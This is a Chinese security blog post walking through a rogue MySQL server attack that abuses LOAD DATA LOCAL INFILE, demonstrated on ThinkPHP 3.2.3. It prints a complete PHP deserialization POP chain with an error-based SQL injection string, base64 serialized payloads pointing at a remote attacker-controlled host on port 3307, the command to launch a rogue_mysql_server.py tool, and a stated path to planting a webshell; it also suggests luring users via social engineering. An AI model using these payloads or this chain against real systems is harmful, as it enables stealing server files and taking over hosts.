【网络安全】如何搭建MySQL恶意服务器读取文件？

[ H_00c8](https://www.jianshu.com/u/3cf70976a08b)关注赞赏支持

# 【网络安全】如何搭建MySQL恶意服务器读取文件？

# 前言

> 注：本文不涉及对MySQL协议报文研究，仅讲解原理，并且做部分演示。

搭建MySQL恶意服务器读取文件这件事，虽然直接利用门槛较高，但是由于在网上看到了一种比较新颖的利用方式（利用社会工程学引诱用户连接MySQL进而读取用户文件），个人觉得比较有意思，总结了一下攻击原理以及攻击方式，因此就有了这篇文章。

# 原理

在阐述具体原理之前，先介绍几个SQL语句，以便后文理解

首先在tmp目录下新建一个tmp.txt

内容如下：

image.png

然后执行下方SQL语句，即可将tmp.txt文件导入其中：

    
    
    mysql> load data local infile "/tmp/tmp.txt" into table test fields terminated by '\n';
    Query OK, 3 rows affected (2.63 sec)
    Records: 3  Deleted: 0  Skipped: 0  Warnings: 0
    
    mysql> select * from Test;
    +-------+
    | name  |
    +-------+
    | admin |
    | user  |
    | Lxxx  |
    +-------+
    3 rows in set (0.00 sec)
    

  * load data local infile语句会读取客户端本地的文件
  * load data infile语句会读取服务端本地的文件
  * terminated by表示以某某字符分割，默认为Tab，这里我设置为了\n

这个时候可能就会绕不清楚，什么是服务端，什么是客户端？

因为一般情况下，调试SQL都是在本机，并且数据库也在本机，这样的情况就导致，客户端和服务端都是在本地，有点难区分，下面我用一张图来简述。

image.png

在本地，由于客户端和服务端都是在同一个磁盘下，因此，在本地，无论是否加local都是可以将文件传入数据库的，而后面讲到利用MySQL恶意服务器读取文件的漏洞，就是需要使用local，来达到将文件带出的目的。

>
> **[【查看相关资料文档】](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDVExrc2JqUU1DWWd5)**  
>  1、网络安全学习路线  
>  2、电子书籍（白帽子）  
>  3、安全大厂内部视频  
>  4、100份src文档  
>  5、常见安全面试题  
>  6、ctf大赛经典题目解析  
>  7、全套工具包  
>  8、应急响应笔记

下面我画了两张图，第一张图是正常业务流程，第二张图是攻击者恶意攻击的流程。

正常的后端业务流程如下：

image.png

当攻击者劫持后端服务器，并且在公网中搭建恶意的MySQL后，流程图如下：

image.png

这样攻击者就可以在后端达到任意文件下载的目的。

# 演示

>
> 虽说在之前的某个CTF比赛出过类似的题目，但是我这里还是使用ThinkPHP3.2.3存在的反序列化漏洞，结合MySQL恶意服务器读取敏感文件，进而RCE的样例。

首先在本地先启动一个ThinkPHP3.2.3的框架，连接好数据库，在Application/Home/Controller/HelloController.class.php控制器中写一个反序列化入口。

    
    
    <?php
    namespace Home\Controller;
    
    use Think\Controller;
    
    class HelloController extends Controller
    {
    public function index($Lxxx){
    echo base64_decode($Lxxx);
    $a = unserialize(base64_decode($Lxxx));
    }
    }
    

具体的链子，我就不跟了，网上也有很多，虽然链子具体的方法不跟进，但是我还是需要介绍一下这条链子能起到一个什么作用。

  1. 首先需要一个反序列化入口，这是毋庸置疑的，没有反序列化入口，那就无法进行反序列化，所以上方我就在HelloController控制器中自己写了一个反序列化入口；
  2. 这条链子最终的链尾是需要数据库的相关信息，例如数据库名，数据库端口，数据库用户以及密码，并且这条链子是允许使用堆叠注入的，因此如果知道数据库相关信息，那么就可以利用堆叠注入写入一句话木马进而getshell。

这里我就直接将链子放出来，然后演示一下如何搭建一个恶意的MySQL数据库，获取敏感文件，进而getshell。

    
    
    <?php
    namespace Think\Db\Driver{
    use PDO;
    class Mysql{
    protected $options = array(
    PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
    );
    protected $config = array(
    "debug"    => 1,
    "database" => "tp323",
    "hostname" => "127.0.0.1",
    "hostport" => "8889",
    "charset"  => "utf8",
    "username" => "root",
    "password" => "root"
    );
    }
    }
    
    namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
    private $img;
    
    public function __construct(){
    $this->img = new Memcache();
    }
    }
    }
    
    namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
    protected $handle;
    
    public function __construct(){
    $this->handle = new Model();
    }
    }
    }
    
    namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
    protected $options   = array();
    protected $pk;
    protected $data = array();
    protected $db = null;
    
    public function __construct(){
    $this->db = new Mysql();
    $this->options['where'] = '';
    $this->pk = 'id';
    $this->data[$this->pk] = array(
    "table" => "tp_user where 1=updatexml(1,concat(0x7e,version(),0x7e),1)#",
    "where" => "1=1"
    );
    }
    }
    }
    
    namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
    }
    
    

上方链子中的数据库信息为我本地的数据库信息，执行该文件后，得到序列化字符串如下：

    
    
    TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjU5OiJ0cF91c2VyIHdoZXJlIDE9dXBkYXRleG1sKDEsY29uY2F0KDB4N2UsdmVyc2lvbigpLDB4N2UpLDEpIyI7czo1OiJ3aGVyZSI7czozOiIxPTEiO319czo1OiIAKgBkYiI7TzoyMToiVGhpbmtcRGJcRHJpdmVyXE15c3FsIjoyOntzOjEwOiIAKgBvcHRpb25zIjthOjE6e2k6MTAwMTtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NToiZGVidWciO2k6MTtzOjg6ImRhdGFiYXNlIjtzOjU6InRwMzIzIjtzOjg6Imhvc3RuYW1lIjtzOjk6IjEyNy4wLjAuMSI7czo4OiJob3N0cG9ydCI7czo0OiI4ODg5IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo4OiJ1c2VybmFtZSI7czo0OiJyb290IjtzOjg6InBhc3N3b3JkIjtzOjQ6InJvb3QiO319fX19
    

传给url

image.png

可以看到报错注入成功。

然后，在公网上搭建一个恶意的MySQL服务，这个脚本在Github中已经有前辈写好了，具体原理就是分析相关的MySQL报文，然后与后端服务器创建恶意连接，并且获得自己想要的文件。

下载好POC之后，修改一下要读取的文件名。

image.png

然后利用Python启动，启动完成后，恶意的MySQL就在监听3307端口。

    
    
    python rogue_mysql_server.py
    

接下来修改之前的链子，把IP和端口修改为远程恶意的MySQL地址，然后生成链子。

    
    
    <?php
    namespace Think\Db\Driver{
    use PDO;
    class Mysql{
    protected $options = array(
    PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
    );
    protected $config = array(
    "debug"    => 1,
    "database" => "tp323",
    "hostname" => "1.1.1.1",
    "hostport" => "3307",
    "charset"  => "utf8",
    "username" => "root",
    "password" => "root"
    );
    }
    }
    
    namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
    private $img;
    
    public function __construct(){
    $this->img = new Memcache();
    }
    }
    }
    
    namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
    protected $handle;
    
    public function __construct(){
    $this->handle = new Model();
    }
    }
    }
    
    namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
    protected $options   = array();
    protected $pk;
    protected $data = array();
    protected $db = null;
    
    public function __construct(){
    $this->db = new Mysql();
    $this->options['where'] = '';
    $this->pk = 'id';
    $this->data[$this->pk] = array(
    "table" => "tp_user where 1=updatexml(1,concat(0x7e,version(),0x7e),1)#",
    "where" => "1=1"
    );
    }
    }
    }
    
    namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
    }
    

得到：

    
    
    TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjU5OiJ0cF91c2VyIHdoZXJlIDE9dXBkYXRleG1sKDEsY29uY2F0KDB4N2UsdmVyc2lvbigpLDB4N2UpLDEpIyI7czo1OiJ3aGVyZSI7czozOiIxPTEiO319czo1OiIAKgBkYiI7TzoyMToiVGhpbmtcRGJcRHJpdmVyXE15c3FsIjoyOntzOjEwOiIAKgBvcHRpb25zIjthOjE6e2k6MTAwMTtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NToiZGVidWciO2k6MTtzOjg6ImRhdGFiYXNlIjtzOjU6InRwMzIzIjtzOjg6Imhvc3RuYW1lIjtzOjc6IjEuMS4xLjEiO3M6ODoiaG9zdHBvcnQiO3M6NDoiMzMwNyI7czo3OiJjaGFyc2V0IjtzOjQ6InV0ZjgiO3M6ODoidXNlcm5hbWUiO3M6NDoicm９vdCI7czo4OiJwYXNzd29yZCI7czo0OiJyb290Ijt9fX19fQ==
    

传给HomeController控制器，

然后就可以在远程ＶＰＳ中的mysql.log得到之前需要恶意下载的文件。

image.png

现在得到了相关数据库信息，然后就可以再次构造链子，利用堆叠注入写入一句话木马getshell了。

# 使用场景

  * 能劫持后端服务器，但无法getshell的时候，可以采用这个方法getshell（例如ThinkPHP3.2.3的利用链只能到数据库层，则可以通过这个方法getshell）；
  * 能引诱用户连接恶意MySQL（社会工程学）。

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [ThinkPHP v3.2.* （SQL注入&文件读取）反序列化POP链](https://www.jianshu.com/p/41782991b4b2)

ThinkPHP v3.2.* （SQL注入&文件读取）反序列化POP链 测试环境 OS:MAC OS PHP:5...

[Jaky233](https://www.jianshu.com/u/abaa2ea44d89)阅读 1,485评论 0赞 0

  * [Jackson安全漏洞，可导致服务器文件被恶意窃取](https://www.jianshu.com/p/dfd6f0ac9f00)

上周升级完Fastjson之后，去了解了下Jackson是否也有相关的漏洞。 果不其然，看到了一个issue 虽然...

[占小狼](https://www.jianshu.com/u/90ab66c248e6)阅读 2,774评论 0赞 9

  * [网络安全岗位面试经验总结（面试必备）](https://www.jianshu.com/p/22032caeaea9)

​ 思路流程: 信息收集 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，c...

[黑战士安全](https://www.jianshu.com/u/055a8fb3aedd)阅读 1,222评论 0赞 4

  * [如何从计算机小白进阶成一个网络安全技术“高手” ？](https://www.jianshu.com/p/680d1e33d366)

泻药，题主提出 小白进阶成一个网络安全技术“高手”，看出来题主可能刚刚接触网络安全，想学习一些技术，刚入门没有方向...

[百汇智创安全君](https://www.jianshu.com/u/43218aef4539)阅读 452评论 1赞 0

  * [2018中原工学院网络安全校赛](https://www.jianshu.com/p/879115af6fc6)

趁着周日没事，去瞅一波别人家的校赛。。。emmm,,,,,, WEB web1签到 打开后是他们团队的一个宣传主页...

[BerL1n](https://www.jianshu.com/u/c531954533ea)阅读 1,668评论 1赞 5

 